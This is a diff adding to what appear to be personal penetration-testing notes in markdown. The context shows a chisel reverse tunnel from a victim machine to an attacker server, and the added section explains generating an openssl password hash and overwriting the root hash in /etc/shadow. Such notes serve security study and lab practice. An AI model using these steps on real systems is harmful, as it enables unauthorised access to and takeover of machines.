@@ -25,3 +25,12 @@ NOTES
 
 - Set up a server with `chisel server -p <port> --reverse` on the attacker machine
 - On the client's machine, use `./chisel client [chisel server's ip]:[chisel's server port} R:[port you want it to tunnel through on the server's machine]:127.0.0.1:[internal port running a service on the victim's machine]`
+
+### To replace the root hash by generating a new one
+
+- Use `openssl passwd -6 (password)`
+- Clear the root hash in `/etc/shadow` and replace it with your hash, notice the highlighted part
+
+  ![image](https://github.com/user-attachments/assets/8270951c-d313-4bf8-9f28-4ac5a58db988)
+
+   
